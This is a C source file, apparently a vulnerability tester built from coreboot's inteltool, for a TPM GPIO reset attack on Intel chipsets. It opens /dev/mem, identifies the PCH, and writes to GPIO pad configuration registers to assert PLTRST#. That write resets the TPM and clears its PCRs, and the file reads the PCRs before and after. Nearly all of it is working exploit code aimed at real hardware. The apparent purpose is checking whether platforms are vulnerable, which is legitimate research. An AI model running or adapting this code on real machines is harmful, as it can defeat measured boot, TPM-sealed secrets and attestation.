/* SPDX-License-Identifier: GPL-2.0-only */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <getopt.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include "inteltool.h"
#include "pcr.h"

#ifdef __NetBSD__
#include <machine/sysarch.h>
#endif

#define MAX_PCR_PORTS 8 /* how often may `--pcr` be specified */

#ifndef __DARWIN__
static int fd_mem;

void *map_physical(uint64_t phys_addr, size_t len)
{
	void *virt_addr;

	virt_addr = mmap(0, len, PROT_WRITE | PROT_READ, MAP_SHARED,
		    fd_mem, (off_t) phys_addr);

	if (virt_addr == MAP_FAILED) {
		printf("Error mapping physical memory 0x%08" PRIx64 "[0x%zx]\n",
			phys_addr, len);
		return NULL;
	}

	return virt_addr;
}

void unmap_physical(void *virt_addr, size_t len)
{
	munmap(virt_addr, len);
}
#endif

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	struct pci_access *pacc = NULL;
	struct pci_dev *sb = NULL, *dev;

#if defined(__FreeBSD__)
	if (open("/dev/io", O_RDWR) < 0) {
		perror("/dev/io");
#elif defined(__NetBSD__)
# ifdef __i386__
	if (i386_iopl(3)) {
		perror("iopl");
# else
	if (x86_64_iopl(3)) {
		perror("iopl");
# endif
#else
	if (iopl(3)) {
		perror("iopl");
#endif
		printf("You need to be root.\n");
		exit(127);
	}

#ifndef __DARWIN__
	if ((fd_mem = open("/dev/mem", O_RDWR)) < 0) {
		perror("Can not open /dev/mem");
		exit(127);
	}
#endif

	pacc = pci_alloc();
	pacc->method = PCI_ACCESS_I386_TYPE1;
	pci_init(pacc);
	pci_scan_bus(pacc);

	/* Find the required devices */
	for (dev = pacc->devices; dev; dev = dev->next) {
		pci_fill_info(dev, PCI_FILL_CLASS);
		/* The ISA/LPC bridge can be 0x1f, 0x07, or 0x04 so we probe. */
		if (dev->device_class == 0x0601) { /* ISA/LPC bridge */
			if (sb == NULL) {
				sb = dev;
			} else {
				fprintf(stderr, "Multiple devices with class ID"
					" 0x0601, using %02x%02x:%02x.%02x\n",
					sb->domain, sb->bus, sb->dev, sb->func);
				break;
			}
		}
	}

	if (!sb) {
		printf("No southbridge found.\n");
		exit(127);
	}

	pci_fill_info(sb, PCI_FILL_IDENT | PCI_FILL_BASES | PCI_FILL_CLASS);

	if (sb->vendor_id != PCI_VENDOR_ID_INTEL) {
		printf("Not an Intel(R) southbridge.\n");
		exit(126);
	}

	pcr_init(sb);

	_Bool known_pch = 0;
	_Bool vulnerable = 1;
	uint8_t port;
	uint16_t offset;
	uint16_t lock_offset;
	uint32_t lock_bit;

	switch (sb->device_id) {
	case PCI_DEVICE_ID_INTEL_H110:
	case PCI_DEVICE_ID_INTEL_H170:
	case PCI_DEVICE_ID_INTEL_Z170:
	case PCI_DEVICE_ID_INTEL_Q170:
	case PCI_DEVICE_ID_INTEL_Q150:
	case PCI_DEVICE_ID_INTEL_B150:
	case PCI_DEVICE_ID_INTEL_C236:
	case PCI_DEVICE_ID_INTEL_C232:
	case PCI_DEVICE_ID_INTEL_QM170:
	case PCI_DEVICE_ID_INTEL_HM170:
	case PCI_DEVICE_ID_INTEL_CM236:
	case PCI_DEVICE_ID_INTEL_HM175:
	case PCI_DEVICE_ID_INTEL_QM175:
	case PCI_DEVICE_ID_INTEL_CM238:
		printf("Found Sunrise Point S/H\n");
		known_pch = 1;
		port = 0xaf;
		offset = 0x528;
		lock_offset = 0xb0;
		lock_bit = 1 << 5;
		break;

	case PCI_DEVICE_ID_INTEL_H270:
	case PCI_DEVICE_ID_INTEL_Z270:
	case PCI_DEVICE_ID_INTEL_Q270:
	case PCI_DEVICE_ID_INTEL_Q250:
	case PCI_DEVICE_ID_INTEL_B250:
	case PCI_DEVICE_ID_INTEL_Z370:
	case PCI_DEVICE_ID_INTEL_H310C:
	case PCI_DEVICE_ID_INTEL_X299:
		printf("Found Kaby Point S/H\n");
		known_pch = 1;
		port = 0xaf;
		offset = 0x528;
		lock_offset = 0xb0;
		lock_bit = 1 << 5;
		break;

	case PCI_DEVICE_ID_INTEL_H610:
	case PCI_DEVICE_ID_INTEL_B660:
	case PCI_DEVICE_ID_INTEL_H670:
	case PCI_DEVICE_ID_INTEL_Q670:
	case PCI_DEVICE_ID_INTEL_Z690:
	case PCI_DEVICE_ID_INTEL_W680:
	case PCI_DEVICE_ID_INTEL_WM690:
	case PCI_DEVICE_ID_INTEL_HM670:
	case PCI_DEVICE_ID_INTEL_R680E:
	case PCI_DEVICE_ID_INTEL_Q670E:
	case PCI_DEVICE_ID_INTEL_H610E:
		printf("Found Alder Point S/H\n");
		known_pch = 1;
		port = 0x6d;
		offset = 0x7d0;
		lock_offset = 0x110;
		lock_bit = 1 << 13;
		break;

	case PCI_DEVICE_ID_INTEL_W790:
	case PCI_DEVICE_ID_INTEL_Z790:
	case PCI_DEVICE_ID_INTEL_H770:
	case PCI_DEVICE_ID_INTEL_B760:
	case PCI_DEVICE_ID_INTEL_HM770:
	case PCI_DEVICE_ID_INTEL_WM790:
	case PCI_DEVICE_ID_INTEL_C262:
	case PCI_DEVICE_ID_INTEL_C266:
		printf("Found Raptor Point S/H\n");
		known_pch = 1;
		port = 0x6d;
		offset = 0x7d0;
		lock_offset = 0x110;
		lock_bit = 1 << 13;
		break;

	default:
		if ((sb->device_id & 0xfff0) == 0x9d40
		    && sb->device_id >= 0x9d4b
		    && sb->device_id <= 0x9d58) {
			printf("Found Sunrise Point LP PCH\n");
			known_pch = 1;
			port = 0xaf;
			offset = 0x528;
			lock_offset = 0xb0;
			lock_bit = 1 << 5;
		} else if ((sb->device_id & 0xfff0) == 0x5180) {
			printf("Found Alder Point P\n");
			known_pch = 1;
			port = 0x6e;
			offset = 0x7d0;
			lock_offset = 0x80;
			lock_bit = 1 << 13;
		} else if ((sb->device_id & 0xfff0) == 0x5190) {
			printf("Found Raptor Point P\n");
			known_pch = 1;
			port = 0x6e;
			offset = 0x7d0;
			lock_offset = 0x80;
			lock_bit = 1 << 13;
		} else if ((sb->device_id & 0xfff0) == 0xa300
			   && sb->device_id >= 0xa304
			   && sb->device_id <= 0xa30e) {
			printf("Found Coffee Lake PCH\n");
			known_pch = 1;
			port = 0x6e;
			offset = 0x6d0;
			lock_offset = 0x88;
			lock_bit = 1 << 13;
		} else if ((sb->device_id & 0xfff0) == 0x0680
			   && sb->device_id >= 0x0684) {
			printf("Found Comet Lake Desktop PCH\n");
			known_pch = 1;
			port = 0xaf;
			offset = 0x528;
			lock_offset = 0xb0;
			lock_bit = 1 << 5;
		} else if (sb->device_id >= 0x0660 && sb->device_id <= 0x0661) {
			printf("Found Comet Lake U PCH\n");
			known_pch = 1;
			port = 0x6e;
			offset = 0x6d0;
			lock_offset = 0x88;
			lock_bit = 1 << 13;
		} else if ((sb->device_id & 0xfff0) == 0x9d80
			   && sb->device_id >= 0x9d84) {
			printf("Found Cannon Point LP PCH\n");
			known_pch = 1;
			port = 0x6e;
			offset = 0x860;
			lock_offset = 0x88;
			lock_bit = 1 << 6;
		} else if ((sb->device_id & 0xfff0) == 0xa080
			   && sb->device_id >= 0xa082) {
			printf("Found Tiger Lake PCH\n");
			known_pch = 1;
			port = 0x6e;
			offset = 0x7d0;
			lock_offset = 0x80;
			lock_bit = 1 << 13;
		} else if ((sb->device_id & 0xfff8) == 0xa0a0) {
			printf("Found Tiger Lake PCH\n");
			known_pch = 1;
			port = 0x6e;
			offset = 0x7d0;
			lock_offset = 0x80;
			lock_bit = 1 << 13;
		} else if ((sb->device_id & 0xfff0) == 0x7e20) {
			printf("Found Arrow Lake S PCH\n");
			known_pch = 1;
			port = 0x6d;
			offset = 0x7d0;
			lock_offset = 0x120;
			lock_bit = 1 << 13;
		} else if ((sb->device_id & 0xfff8) == 0x7e00) {
			printf("Found Meteor Lake PCH - NOT VULNERABLE to PLTRST# assertion\n");
			known_pch = 1;
			vulnerable = 0;
		} else {
			printf("Unknown PCH device ID %04x\n", sb->device_id);
		}
		break;
	}

	int exit_code = 0;
	int pad_was_in_gpio = 0;

	if (known_pch && !vulnerable) {
		printf("\nPlatform is NOT VULNERABLE to TPM GPIO reset attack.\n");
		printf("GPIO pad lock is functional on this PCH -- assertion skipped.\n");
		exit_code = 2;
	}

	if (known_pch && vulnerable) {
		/* Check pad lock status before attempting assertion */
		uint32_t lock_val = read_pcr32(port, lock_offset);
		uint32_t locktx_val = read_pcr32(port, lock_offset + 4);
		int bit = __builtin_ctz(lock_bit);
		int cfg_locked = !!(lock_val & lock_bit);
		int tx_locked = !!(locktx_val & lock_bit);

		printf("\n--- PADCFGLOCK Status (port 0x%x, offset 0x%x) ---\n", port, lock_offset);
		printf("PADCFGLOCK   = 0x%08x (%s, bit %d %s)\n",
		       lock_val,
		       cfg_locked ? "LOCKED" : "UNLOCKED",
		       bit,
		       cfg_locked ? "set" : "clear");
		printf("PADCFGLOCKTX = 0x%08x (%s, bit %d %s)\n",
		       locktx_val,
		       tx_locked ? "LOCKED" : "UNLOCKED",
		       bit,
		       tx_locked ? "set" : "clear");

		if (cfg_locked || tx_locked) {
			printf("\nWARNING: Pad is LOCKED -- assertion write will be silently ignored!\n");
		}

		/* Read PCRs before assertion */
		printf("\n--- PCR State Before Assertion ---\n");
		fflush(stdout);
		system("tpm2 startup -c 2>/dev/null; tpm2 pcrread 2>/dev/null | grep -A24 'sha256:' || echo '  (TPM not accessible)'");

		/* Cleanly shut down TPM session before assertion (kukri procedure) */
		printf("\n--- TPM Session Preparation ---\n");
		printf("Running tpm2 shutdown -c to cleanly shut down TPM session\n");
		fflush(stdout);
		system("tpm2 shutdown -c 2>/dev/null");

		printf("\n*** WARNING: About to assert PLTRST# -- TPM may reboot (PCRs clear, NVRAM preserved) ***\n");
		sleep(2);

		uint32_t dw0 = read_pcr32(port, offset + 0);
		uint32_t dw1 = read_pcr32(port, offset + 4);

		printf("PCR port=0x%x offset=0x%x\n", port, offset);
		printf("DW0 (original) = 0x%08x  DW1 (original) = 0x%08x\n", dw0, dw1);

		/* Check pad mode: NF1->GPIO transition creates the reset edge */
		uint32_t pad_mode = (dw0 >> 10) & 0xf;
		const char *mode_name = pad_mode == 0 ? "GPIO" :
					pad_mode == 1 ? "NF1" :
					pad_mode == 2 ? "NF2" : "NF3+";
		int can_transition = (pad_mode != 0);
		pad_was_in_gpio = (pad_mode == 0);

		printf("\n--- Pad Mode Check ---\n");
		printf("Current mode: %s (DW0 bits 13:10 = 0x%x)\n", mode_name, pad_mode);
		if (can_transition)
			printf("Mode transition possible: %s -> GPIO -> %s (creates PLTRST# reset edge)\n",
			       mode_name, mode_name);
		else
			printf("Mode is GPIO -- locked by FSP-S, NO transition possible\n");
		printf("PLTRST# assertion %s\n",
		       can_transition ? "CAN attempt mode transition reset" :
					"BLOCKED -- cannot create reset edge without NF1->GPIO switch");

		if (!can_transition) {
			printf("\n*** WARNING: Pad is in GPIO mode -- mode locked by FSP-S ***\n");
			printf("*** The NF1->GPIO mode transition cannot happen.       ***\n");
			printf("*** PLTRST# reset edge may NOT be created.            ***\n");
		}

		/* Flush stdout before assertion -- output after platform reset may be lost */
		fflush(stdout);

		write_pcr32(port, offset + 0, 0x80000000);   // dw0 - assert PLTRST#
		write_pcr32(port, offset + 4, 0x00000000);   // dw1

		sleep(1);

		// Readback to verify write took effect
		uint32_t dw0_rb = read_pcr32(port, offset + 0);
		uint32_t dw1_rb = read_pcr32(port, offset + 4);
		int dw0_ok = (dw0_rb == 0x80000000);
		int dw1_ok = (dw1_rb == 0x00000000);
		printf("DW0 (asserted) = 0x%08x  DW1 (asserted) = 0x%08x\n", dw0_rb, dw1_rb);
		if (!dw0_ok)
			printf("Pad reconfiguration FAILED (TX=0, mode=GPIO) -- %s\n",
			       "WRITE IGNORED - pad may be locked");
		if (!dw1_ok)
			printf("DW1 partially locked (TX control bits) - does not prevent reset\n");

		write_pcr32(port, offset + 0, dw0);
		write_pcr32(port, offset + 4, dw1);

		printf("Registers restored\n");

		/* Reinitialize TPM after reset (kukri procedure) */
		printf("Running tpm2 startup -c to reinitialize TPM\n");
		fflush(stdout);
		system("tpm2 startup -c 2>/dev/null");

		/* Read PCRs after assertion */
		printf("\n--- PCR State After Assertion ---\n");
		fflush(stdout);
		system("tpm2 startup -c 2>/dev/null; tpm2 pcrread 2>/dev/null | grep -A24 'sha256:' || echo '  (TPM not accessible)'");

		exit_code = dw0_ok ? 0 : 1;
	}

	if (!known_pch)
		exit_code = 126;

	printf("\n=== RESULT: %s ===\n",
	       exit_code == 0 ? "DW0 write verified -- compare before/after PCR output for confirmation" :
	       exit_code == 1 ? "Pad reconfiguration FAILED (DW0 write ignored -- pad locked by firmware)" :
	       exit_code == 2 ? "not vulnerable (assertion skipped)" :
	       exit_code == 126 ? "unknown PCH" :
	       "hardware access error");

	printf("\nReport results: https://github.com/tlaurion/tpm-gpio-fail/issues\n");
	printf("Include this log output.\n");

	/* Clean up */
	pcr_cleanup();
	/* `sb` wasn't allocated by pci_get_dev() */
	pci_cleanup(pacc);

	return exit_code;
}

